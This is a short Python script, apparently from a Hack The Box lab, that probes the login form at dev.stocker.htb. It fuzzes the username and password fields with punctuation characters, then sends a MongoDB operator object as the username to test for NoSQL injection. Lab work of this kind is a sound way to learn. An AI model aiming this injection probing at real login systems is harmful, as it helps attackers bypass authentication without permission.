from string import punctuation
import requests
import json

url = 'http://dev.stocker.htb/login'

def testCharacters():
    for char in punctuation: 
        jsonPayload = { "username": char, "password": char }
        jsonRes = requests.post(url, json=json.dumps(jsonPayload))

        formPayload = "username={}&password={}".format(char, char)
        formRes = requests.post('http://dev.stocker.htb/login', data=formPayload)

        if jsonRes.status_code > 499 or formRes.status_code > 499:
            print('response for char {}:')
            print('    JSON status code {}'.format(jsonRes.status_code))
            print('    JSON error in content {}'.format('[E|e]rror' in str(jsonRes.content)))
            print('    FORM status code {}'.format(formRes.status_code))
            print('    JSON error in content {}'.format('[E|e]rror' in str(formRes.content)))

def testMongoCrash():
    mongoPayload = { "username": { "$brut": "tu" }, "password": "password" }
    mongoRes = requests.post(url, json=json.dumps(mongoPayload))
    print(str(mongoRes.content))

testMongoCrash()

